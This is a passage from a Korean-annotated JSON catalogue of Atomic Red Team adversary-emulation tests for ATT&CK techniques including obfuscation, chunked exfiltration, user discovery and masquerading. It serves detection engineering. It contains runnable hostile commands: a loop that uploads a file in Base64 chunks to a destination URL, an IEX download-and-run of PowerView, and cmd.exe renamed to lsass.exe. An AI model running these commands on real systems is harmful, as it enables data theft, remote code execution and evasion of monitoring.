  "artifacts": {
    "files_created": [
      {
        "path": "T1027.013_decodedEicar.txt",
        "description": "Base64로 인코딩되어 있던 EICAR 문자열을 디코딩해 저장한 텍스트 파일"
      }
    ],
    "files_read": [],
    "registry_keys": [],
    "processes": [
      {
        "name": "powershell.exe",
        "description": "Base64 문자열을 디코딩하고 T1027.013_decodedEicar.txt 파일을 생성하는 PowerShell 프로세스",
        "commandline_pattern": "powershell.exe *T1027.013_decodedEicar.txt*"
      }
    ],
    "network": []
  },

  "cleanup": [
    "현재 작업 디렉터리에 생성된 T1027.013_decodedEicar.txt 파일을 삭제해 테스트 흔적을 제거한다."
  ],

  "metadata": {
    "atomic_source_id": "7693ccaa-8d64-4043-92a5-a2eb70359535"
  }
},

{
  "test_id": "T1027.013-2",
  "name": "Decrypt Eicar File and Write to File",
  "platforms": ["windows"],

  "summary": "ConvertTo-SecureString와 대칭 키를 이용해 암호화된 문자열을 복호화하고, 그 결과(EICAR 테스트 패턴)를 파일로 기록하는 시나리오를 재현한다. 실제 악성 코드에서 자주 사용하는 \"암호화된 페이로드 + 런타임 복호화\" 패턴을 단순화한 형태이다.",

  "procedure": [
    "PowerShell 스크립트 내에 암호화된 문자열을 $encryptedString 변수에 저장한다.",
    "고정된 32바이트 길이의 대칭 키를 $key 배열에 정의한다.",
    "ConvertTo-SecureString -Key 옵션을 사용해 $encryptedString을 SecureString 형태로 복호화한다.",
    "Runtime.InteropServices.Marshal 클래스를 이용해 SecureString을 일반 문자열로 변환한다.",
    "복호화된 문자열을 Out-File을 사용해 현재 작업 디렉터리에 T1027.013_decryptedEicar.txt 파일로 저장한다."
  ],

  "commands": [
    {
      "executor": "powershell",
      "elevation_required": false,
      "command": "$encryptedString = \"76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA=\"\n$key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32\n\n$decrypt = ConvertTo-SecureString -String $encryptedString -Key $key\n$decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))\n\n#Write the decrypted eicar string to a file\n$decryptedString | out-file T1027.013_decryptedEicar.txt"
    }
  ],

  "prerequisites": [
    "Windows 환경에서 PowerShell이 사용 가능해야 한다.",
    "현재 작업 디렉터리에 파일을 생성할 수 있는 권한이 필요하다.",
    "테스트 환경의 보안 정책에 따라 EICAR 유사 패턴 생성이 허용되는지 사전 확인이 필요하다."
  ],

  "artifacts": {
    "files_created": [
      {
        "path": "T1027.013_decryptedEicar.txt",
        "description": "암호화된 문자열을 대칭 키로 복호화하여 기록한 텍스트 파일(EICAR 테스트 패턴 포함)"
      }
    ],
    "files_read": [],
    "registry_keys": [],
    "processes": [
      {
        "name": "powershell.exe",
        "description": "암호화된 문자열을 SecureString 기반으로 복호화하고 T1027.013_decryptedEicar.txt 파일을 생성하는 PowerShell 프로세스",
        "commandline_pattern": "powershell.exe *T1027.013_decryptedEicar.txt*"
      }
    ],
    "network": []
  },

  "cleanup": [
    "현재 작업 디렉터리에 생성된 T1027.013_decryptedEicar.txt 파일을 삭제해 테스트 흔적을 제거한다."
  ],

  "metadata": {
    "atomic_source_id": "b404caaa-12ce-43c7-9214-62a531c044f7"
  }
}
]
},
{
"technique_id": "T1030",
"technique_name": "Data Transfer Size Limits",
"tactic": "Exfiltration",
"description": "데이터를 한 번에 크게 보내지 않고, 탐지를 피하기 위해 작은 크기의 여러 청크(chunk)로 나누어 전송하는 기법이다. IDS/프록시/데이터양 기반 탐지 우회를 목적으로 사용되며, 파일을 일정 크기로 분할해 반복적으로 업로드하는 형태로 자주 관찰된다.",

"tests": [
{
"test_id": "T1030-1",
"name": "Network-Based Data Transfer in Small Chunks",
"platforms": ["windows"],
  "summary": "PowerShell을 사용해 지정한 파일을 일정 크기의 청크로 나누어 읽고, 각 청크를 Base64로 인코딩한 후 HTTP POST 요청으로 전송하는 시나리오를 재현한다. 전송 단위를 잘게 나눔으로써 전송량 기반 탐지 우회를 시뮬레이션할 수 있다.",

  "procedure": [
    "source_file_path에 지정된 파일을 .NET FileStream(OpenRead)으로 연다.",
    "chunk_size(기본 1024KB)에 따라 바이트 배열 버퍼를 생성한다.",
    "while 루프로 파일이 끝날 때까지 버퍼 단위로 데이터를 읽는다.",
    "읽어온 바이트를 Convert.ToBase64String으로 Base64 문자열로 인코딩한다.",
    "Invoke-WebRequest를 사용해 destination_url로 Base64 인코딩된 청크를 HTTP POST 방식으로 전송한다.",
    "파일 스트림을 닫고 전송을 종료한다."
  ],

  "commands": [
    {
      "executor": "powershell",
      "elevation_required": false,
      "command": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n  \nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()"
    }
  ],

  "prerequisites": [
    "Windows 환경에서 PowerShell 실행이 가능해야 한다.",
    "source_file_path에 지정된 경로에 실제로 읽을 수 있는 파일이 존재해야 한다.",
    "destination_url(HTTP/HTTPS)에 대해 아웃바운드 네트워크 통신이 허용되어 있어야 한다.",
    "대용량 파일 전송 시 네트워크/보안 장비 정책에 따라 차단될 수 있으므로, 사전에 테스트 환경 정책을 확인해야 한다."
  ],

  "artifacts": {
    "files_created": [],
    "files_read": [
      {
        "path": "#{source_file_path}",
        "description": "청크 단위로 읽혀 Base64 인코딩 후 네트워크로 전송되는 원본 파일"
      }
    ],
    "registry_keys": [],
    "processes": [
      {
        "name": "powershell.exe",
        "description": "파일을 청크 단위로 읽어 Base64 인코딩 후 Invoke-WebRequest로 반복 전송하는 PowerShell 프로세스",
        "commandline_pattern": "powershell.exe *Invoke-WebRequest*"
      }
    ],
    "network": [
      {
        "protocol": "HTTP/HTTPS",
        "destination": "#{destination_url}",
        "description": "Base64 인코딩된 데이터 청크를 POST 요청으로 여러 번 전송하는 아티팩트"
      }
    ]
  },

  "cleanup": [
    "테스트 자체는 로컬 파일을 읽기만 하므로 별도의 파일 정리 작업은 필요하지 않다.",
    "필요 시 대상 서버에 저장된 테스트용 업로드 데이터는 서버 측에서 수동으로 삭제할 수 있다."
  ],

  "metadata": {
    "atomic_source_id": "f0287b58-f4bc-40f6-87eb-692e126e7f8f"
  }
}
]
},
{
  "technique_id": "T1033",
  "technique_name": "System Owner/User Discovery",
  "tactic": "Discovery",
  "description": "시스템의 현재 로그인 사용자, 도메인 사용자, 세션 정보를 확인해 \"누가 어디에 로그인해 있는지\"를 파악하는 기법이다. 공격자는 권한 상승 대상 계정, 세션 하이재킹·가로채기 대상, 측면 이동(Lateral Movement) 경로를 정하기 위해 이러한 정보를 수집한다.",

  "tests": [
    {
      "test_id": "T1033-1",
      "name": "System Owner/User Discovery via cmd.exe, wmic, quser, qwinsta",
      "platforms": ["windows"],
      "summary": "whoami, wmic useraccount, quser, qwinsta 등을 이용해 로컬 및 원격 컴퓨터의 사용자/세션 정보를 수집하고, 결과 일부를 computers.txt, usernames.txt 파일로 저장하는 시나리오를 재현한다.",
      "procedure": [
        "whoami로 현재 로그온 사용자를 확인한다.",
        "wmic useraccount get /ALL로 시스템에 존재하는 계정 정보를 조회한다.",
        "quser /SERVER와 quser로 원격 및 로컬 세션 정보를 가져온다.",
        "qwinsta.exe /server 및 qwinsta.exe로 터미널 세션 상태를 조회한다.",
        "qwinsta 결과를 파싱해 활성 세션이 있는 컴퓨터 이름을 computers.txt에 저장한다.",
        "computers.txt에 기록된 각 컴퓨터에 대해 다시 qwinsta를 실행해 사용자명을 usernames.txt에 저장한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i ^| find /v \"#\" ^| find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i ^| find /v \"#\" ^| find /v \"console\" || echo %j > usernames.txt"
        }
      ],
      "prerequisites": [
        "테스트를 수행하는 계정이 wmic, quser, qwinsta를 실행할 수 있어야 한다.",
        "computer_name에 지정된 원격 호스트에 대해 네트워크 연결과 세션 조회 권한이 있어야 한다.",
        "현재 작업 디렉터리에 computers.txt 및 usernames.txt를 생성할 수 있는 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": ".\\\\computers.txt",
            "description": "qwinsta 결과를 기반으로 활성 세션이 있는 원격 컴퓨터 이름 목록"
          },
          {
            "path": ".\\\\usernames.txt",
            "description": "각 컴퓨터에서 발견된 활성 사용자 세션 목록"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "여러 사용자/세션 조회 명령을 실행하는 쉘 프로세스",
            "commandline_pattern": "cmd.exe /C whoami*"
          },
          {
            "name": "wmic.exe",
            "description": "로컬/도메인 사용자 계정 정보를 조회하는 WMIC 호출",
            "commandline_pattern": "wmic useraccount get /ALL"
          },
          {
            "name": "quser.exe",
            "description": "로컬 및 원격 세션 정보를 조회하는 quser 명령",
            "commandline_pattern": "quser*"
          },
          {
            "name": "qwinsta.exe",
            "description": "터미널 세션 상태를 조회하는 qwinsta 명령",
            "commandline_pattern": "qwinsta*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "현재 작업 디렉터리에 생성된 computers.txt, usernames.txt 파일을 삭제해 흔적을 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "4c4959bf-addf-4b4a-be86-8d09cc1857aa"
      }
    },

    {
      "test_id": "T1033-2",
      "name": "Find computers where user has session - Stealth mode (PowerView)",
      "platforms": ["windows"],
      "summary": "인터넷에서 PowerView.ps1을 로드한 뒤 Invoke-UserHunter -Stealth를 사용해 현재 사용자의 세션이 존재하는 도메인 내 컴퓨터를 탐색하는 시나리오이다. 측면 이동을 위한 타깃 호스트를 찾는 단계에 해당한다.",
      "procedure": [
        "PowerShell에서 TLS 1.2 프로토콜을 사용하도록 SecurityProtocol을 설정한다.",
        "raw.githubusercontent.com에서 PowerView.ps1 스크립트를 다운로드해 메모리에 로드(IEX)한다.",
        "Invoke-UserHunter -Stealth -Verbose 명령을 실행해 도메인 내에서 현재 사용자 세션이 존재하는 호스트를 탐색한다.",
        "발견된 세션과 컴퓨터 정보를 콘솔에 출력한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose"
        }
      ],
      "prerequisites": [
        "도메인 환경에서 실행되어야 하며, AD 질의 권한이 필요하다.",
        "호스트가 인터넷(또는 해당 GitHub URL)에 접근 가능해야 한다.",
        "PowerShell 스크립트 실행 정책이 원격 스크립트 실행을 허용해야 한다(또는 bypass 등 우회 사용)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "원격 GitHub에서 PowerView.ps1을 로드하고 Invoke-UserHunter를 실행하는 프로세스",
            "commandline_pattern": "*Invoke-UserHunter -Stealth*"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "destination": "raw.githubusercontent.com",
            "description": "PowerView.ps1 다운로드를 위한 GitHub 원격 연결"
          }
        ]
      },
      "cleanup": [
        "PowerShell 콘솔 히스토리를 정리해 명령 실행 흔적을 줄일 수 있다.",
        "메모리에 로드된 PowerView 모듈은 PowerShell 세션 종료 시 사라진다."
      ],
      "metadata": {
        "atomic_source_id": "29857f27-a36f-4f7e-8084-4557cd6207ca"
      }
    },

    {
      "test_id": "T1033-3",
      "name": "User Discovery With Env Vars PowerShell Script",
      "platforms": ["windows"],
      "summary": "PowerShell 환경 변수와 .NET API를 이용해 현재 로그인된 사용자 이름을 조회하고, 결과를 CurrentactiveUser.txt 파일에 기록하는 간단한 사용자 식별 시나리오이다.",
      "procedure": [
        "[System.Environment]::UserName을 사용해 현재 사용자 이름을 가져온다.",
        "해당 값을 .\\\\CurrentactiveUser.txt 파일로 출력한다.",
        "$env:UserName 환경 변수를 사용해 동일한 정보를 다시 가져와 같은 파일에 Append 한다.",
        "결과 파일을 통해 현재 활성 사용자 계정을 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"
        }
      ],
      "prerequisites": [
        "현재 디렉터리에 파일을 생성/쓰기 할 수 있는 권한이 있어야 한다.",
        "PowerShell 실행이 허용된 Windows 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": ".\\\\CurrentactiveUser.txt",
            "description": "현재 로그인된 사용자 이름을 기록한 텍스트 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "환경 변수와 .NET API를 사용해 사용자 정보를 가져와 파일에 기록하는 프로세스",
            "commandline_pattern": "*CurrentactiveUser.txt*"
          }
        ],
        "network": []
      },
      "cleanup": [
        ".\\\\CurrentactiveUser.txt 파일을 삭제해 사용자 정보 기록을 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "dcb6cdee-1fb0-4087-8bf8-88cfd136ba51"
      }
    },

    {
      "test_id": "T1033-4",
      "name": "GetCurrent User with PowerShell Script",
      "platforms": ["windows"],
      "summary": "WindowsIdentity .NET 클래스의 GetCurrent 메서드를 사용해 현재 보안 컨텍스트의 Windows 사용자 정보를 가져오고, 결과 객체를 CurrentUserObject.txt에 저장하는 테스트이다.",
      "procedure": [
        "PowerShell에서 [System.Security.Principal.WindowsIdentity]::GetCurrent() 호출로 현재 사용자 토큰 정보를 얻는다.",
        "해당 객체의 문자열 표현을 .\\\\CurrentUserObject.txt 파일로 출력한다.",
        "파일을 통해 SID, 인증 유형 등 보다 상세한 사용자 정보를 확인할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt"
        }
      ],
      "prerequisites": [
        "현재 디렉터리에 파일 생성 및 쓰기가 가능해야 한다.",
        "PowerShell에서 .NET 클래스 호출이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": ".\\\\CurrentUserObject.txt",
            "description": "현재 WindowsIdentity 객체 정보를 포함한 텍스트 파일 (사용자 SID, 인증 정보 등)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WindowsIdentity::GetCurrent() 호출 결과를 파일로 저장하는 프로세스",
            "commandline_pattern": "*CurrentUserObject.txt*"
          }
        ],
        "network": []
      },
      "cleanup": [
        ".\\\\CurrentUserObject.txt 파일을 삭제해 사용자 토큰 정보 기록을 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b"
      }
    },

    {
      "test_id": "T1033-5",
      "name": "System Discovery - SocGholish whoami",
      "platforms": ["windows"],
      "summary": "SocGholish 캠페인에서 관찰된 것처럼 whoami /all 출력 결과를 임시 디렉터리의 무작위 파일(radXXXXX.tmp)에 기록하는 동작을 모방한다. 파일명 패턴과 Temp 경로를 통해 탐지 포인트를 만들 수 있다.",
      "procedure": [
        "대문자 알파벳과 숫자 배열을 기반으로 랜덤 토큰 세트를 생성한다.",
        "무작위로 선택된 5글자 문자열을 만들어 rad<랜덤>.tmp 형식의 파일 이름을 만든다.",
        "whoami.exe /all 명령을 실행하고 결과를 지정된 output_path(기본 $env:temp) 내 rad*.tmp 파일에 리다이렉트한다.",
        "나중에 cleanup 단계에서 rad*.tmp 파일을 삭제할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file"
        }
      ],
      "prerequisites": [
        "output_path(기본 $env:temp)에 파일을 생성할 수 있는 권한이 있어야 한다.",
        "whoami.exe 실행이 허용된 Windows 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{output_path}\\\\rad*.tmp",
            "description": "whoami /all 결과를 포함한 무작위 이름의 임시 파일 (SocGholish 유사 패턴)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "whoami.exe",
            "description": "현재 사용자 및 그룹/권한 정보를 조회하는 whoami /all 호출",
            "commandline_pattern": "whoami.exe /all"
          },
          {
            "name": "powershell.exe",
            "description": "랜덤 파일 이름 생성 후 whoami 출력을 임시 파일로 리다이렉트하는 스크립트를 실행하는 프로세스",
            "commandline_pattern": "*rad*.tmp*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell cleanup 명령을 사용해 #{output_path}\\\\rad*.tmp 파일을 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "3d257a03-eb80-41c5-b744-bb37ac7f65c7"
      }
    },

    {
      "test_id": "T1033-6",
      "name": "System Owner/User Discovery Using Command Prompt",
      "platforms": ["windows"],
      "summary": "cmd.exe 기본 명령(환경 변수, net users, query user)을 사용해 현재 시스템의 사용자 계정, 도메인 정보, 세션 정보를 수집하고 결과를 임시 파일(user_info_*.tmp)에 저장하는 테스트이다.",
      "procedure": [
        "output_file_path(기본 $env:temp)에 user_info_%random%.tmp 이름의 출력 파일 경로를 구성한다.",
        "USERNAME, USERDOMAIN 환경 변수를 읽어 현재 사용자와 도메인 정보를 파일에 기록한다.",
        "net users 명령을 실행해 로컬 사용자 계정 목록을 파일에 추가한다.",
        "query user 명령으로 현재 세션 정보를 파일에 추가 기록한다.",
        "cleanup 단계에서 user_info_*.tmp 파일을 삭제할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "set file=#{output_file_path}\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%"
        }
      ],
      "prerequisites": [
        "output_file_path(예: %TEMP%) 경로에 파일 생성 및 쓰기가 가능해야 한다.",
        "net users, query user 명령 실행이 허용된 권한이어야 한다 (일반 사용자 환경에서도 대개 가능)."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{output_file_path}\\\\user_info_*.tmp",
            "description": "현재 사용자, 도메인, 사용자 목록, 세션 정보를 포함하는 임시 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "환경 변수와 net users, query user를 실행해 정보를 수집하는 명령 프롬프트",
            "commandline_pattern": "*user_info_%random%.tmp*"
          },
          {
            "name": "net.exe",
            "description": "사용자 목록을 조회하는 net users 호출",
            "commandline_pattern": "net users"
          },
          {
            "name": "query.exe",
            "description": "로그온 세션 정보를 조회하는 query user 호출",
            "commandline_pattern": "query user"
          }
        ],
        "network": []
      },
      "cleanup": [
        "output_file_path 경로에서 user_info_*.tmp 파일을 삭제해 사용자 정보 수집 흔적을 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "ba38e193-37a6-4c41-b214-61b33277fe36"
      }
    }
  ]
},
{
  "technique_id": "T1036",
  "technique_name": "Masquerading",
  "tactic": "Defense Evasion",
  "description": "정상 프로그램이나 시스템 파일을 가장해(이름, 경로, 아이콘 등) 실행되는 기법이다. 공격자는 보안 솔루션과 관리자의 의심을 피하기 위해 시스템 파일을 비정상 위치에 복사하거나, 압축·스크립트 구조 안에 악성 코드를 숨겨 정상 파일처럼 보이도록 사용한다.",

  "tests": [
    {
      "test_id": "T1036-1",
      "name": "System File Copied to Unusual Location",
      "platforms": ["windows"],
      "summary": "System32에 존재하는 cmd.exe를 All Users 프로필 디렉터리(예: C:\\\\ProgramData)에 복사한 뒤, 비정상 경로에서 cmd.exe를 실행하는 시나리오를 통해 \"시스템 파일이 비표준 경로에서 실행\"되는 위장(Masquerading) 행위를 모방한다.",
      "procedure": [
        "원본 시스템 파일인 %WINDIR%\\\\System32\\\\cmd.exe를 %ALLUSERSPROFILE% 루트 디렉터리로 복사한다.",
        "복사된 %ALLUSERSPROFILE%\\\\cmd.exe를 Start-Process로 실행한다.",
        "일정 시간(sleep 5초) 대기 후, 실행된 cmd 프로세스를 종료한다.",
        "이 과정에서 시스템 파일이 비정상적인 경로에서 실행되었다는 흔적이 남는다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null"
        }
      ],
      "prerequisites": [
        "PowerShell을 실행할 수 있는 Windows 환경이어야 한다.",
        "%WINDIR% 및 %ALLUSERSPROFILE% 경로에 대한 읽기/쓰기 권한이 필요하다.",
        "시스템 파일(cmd.exe)을 복사 및 실행할 수 있어야 하므로, 일부 환경에서는 관리자 권한이 요구될 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%ALLUSERSPROFILE%\\\\cmd.exe",
            "description": "System32에서 복사된 cmd.exe. 시스템 디렉터리가 아닌 위치의 동일 파일 이름 실행은 위장 의심 포인트가 될 수 있다."
          }
        ],
        "files_read": [
          {
            "path": "%WINDIR%\\\\System32\\\\cmd.exe",
            "description": "정상 시스템 경로에 위치한 원본 cmd.exe 실행 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "복사 및 Start-Process, Stop-Process를 수행하는 PowerShell 스크립트 실행 프로세스",
            "commandline_pattern": "*copy-item*System32\\cmd.exe*allusersprofile\\cmd.exe*"
          },
          {
            "name": "cmd.exe",
            "description": "비정상 경로(%ALLUSERSPROFILE%)에서 실행된 cmd 셸",
            "commandline_pattern": "*\\ProgramData\\cmd.exe*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell에서 remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue 명령을 실행해 복사된 cmd.exe를 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "51005ac7-52e2-45e0-bdab-d17c6d4916cd"
      }
    },

    {
      "test_id": "T1036-2",
      "name": "Malware Masquerading and Execution from Zip File",
      "platforms": ["windows"],
      "summary": "GitHub에서 T1036.zip을 내려받아 해제한 뒤 README.cmd를 실행하여 내부의 PDF를 DLL로 이름 변경하고 실행하는 BazaLoader 유사 기법을 재현한다. 압축 파일 속 정상 문서/스크립트처럼 보이는 요소로 악성 DLL 실행을 위장하는 시나리오이다.",
      "procedure": [
        "외부에서 악성(시뮬레이션용) ZIP 파일을 PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1036.zip 경로로 다운로드한다.",
        "PowerShell Expand-Archive를 사용해 ZIP을 %USERPROFILE%\\\\Downloads\\\\T1036 경로에 압축 해제한다.",
        "작업 디렉터리를 %USERPROFILE%\\\\Downloads\\\\T1036 로 변경한다.",
        "README.cmd 파일을 cmd /c로 실행하여, 내부 로직에 따라 .pdf 파일을 .dll로 이름 변경하고 DLL을 로드·실행한다.",
        "테스트 완료 후 Calculator.exe를 종료하고, T1036 폴더를 정리한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null"
        }
      ],
      "prerequisites": [
        "사전에 PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1036.zip 경로에 ZIP 파일이 존재해야 한다(또는 Atomic의 get_prereq_command로 다운로드).",
        "사용자 프로필의 Downloads 폴더에 대한 쓰기 권한이 있어야 한다.",
        "PowerShell에서 Expand-Archive cmdlet을 사용할 수 있어야 한다(Windows 10+ 또는 해당 모듈).",
        "cmd.exe 및 스크립트 실행(README.cmd)이 허용된 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%USERPROFILE%\\\\Downloads\\\\T1036\\\\README.cmd",
            "description": "압축 해제된 커맨드 스크립트로, 사용자가 더블클릭하기 쉽도록 정상 README 파일처럼 위장될 수 있다."
          },
          {
            "path": "%USERPROFILE%\\\\Downloads\\\\T1036\\\\*.pdf",
            "description": "초기에는 정상 문서처럼 보이는 PDF 파일로 존재할 수 있다."
          },
          {
            "path": "%USERPROFILE%\\\\Downloads\\\\T1036\\\\*.dll",
            "description": "README.cmd 실행 과정에서 PDF가 DLL로 이름 변경되어 생성/갱신되는 파일. 위장된 악성 페이로드 역할을 할 수 있다."
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1036.zip",
            "description": "외부에서 내려받은 ZIP 아카이브. 내부에 위장용 스크립트와 페이로드가 포함된다."
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ZIP 압축 해제와 디렉터리 변경, cmd 호출을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "*Expand-Archive*ExternalPayloads\\T1036.zip*Downloads\\T1036*"
          },
          {
            "name": "cmd.exe",
            "description": "README.cmd 배치 스크립트를 실행하는 명령 프롬프트",
            "commandline_pattern": "*README.cmd*"
          },
          {
            "name": "Calculator.exe",
            "description": "테스트용 페이로드 실행 결과로 기동되는 계산기 프로세스(샘플 악성 DLL 실행 효과를 시뮬레이션)",
            "commandline_pattern": "Calculator.exe"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "destination": "github.com or raw.githubusercontent.com",
            "description": "사전 단계에서 T1036.zip을 다운로드할 때 발생하는 외부 연결(Atomic get_prereq_command 기준)."
          }
        ]
      },
      "cleanup": [
        "taskkill /IM Calculator.exe /f >$null 2>$null 명령으로 실행 중인 계산기를 강제 종료한다.",
        "%USERPROFILE%\\\\Downloads\\\\T1036 폴더를 재귀적으로 삭제해(압축 해제된 스크립트 및 DLL 포함) 흔적을 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "4449c89b-ec82-43a4-89c1-91e2f1abeecc"
      }
    }
  ]
},
{
  "technique_id": "T1036.003",
  "technique_name": "Masquerading: Rename System Utilities",
  "tactic": "Defense Evasion",
  "description": "정상 시스템 유틸리티(cmd.exe, powershell.exe, wscript.exe 등)의 이름과 경로를 바꿔 lsass.exe, svchost.exe 같은 신뢰받는 프로세스로 위장하는 기법이다. 공격자는 보안 모니터링 우회를 위해 동일 실행 파일을 다른 이름과 비표준 경로에서 실행하거나, 악성 PE를 시스템 프로세스 이름으로 바꿔 실행한다. 프로세스·이미지 경로·서명·계정 정보가 불일치하는 지점을 DFIR에서 중요한 탐지 포인트로 활용할 수 있다.",

  "tests": [
    {
      "test_id": "T1036.003-1",
      "name": "Masquerading as Windows LSASS process",
      "platforms": ["windows"],
      "summary": "System32의 cmd.exe를 %SystemRoot%\\Temp 경로로 복사한 뒤 파일명을 lsass.exe로 변경하고 실행한다. 결과적으로 lsass.exe란 이름의 프로세스가 비표준 경로(Temp)에서 실행되는 상황을 만들어 LSASS 프로세스를 위장하는 시나리오를 재현한다.",
      "procedure": [
        "%SystemRoot%\\System32\\cmd.exe 파일을 %SystemRoot%\\Temp\\lsass.exe 이름으로 복사한다.",
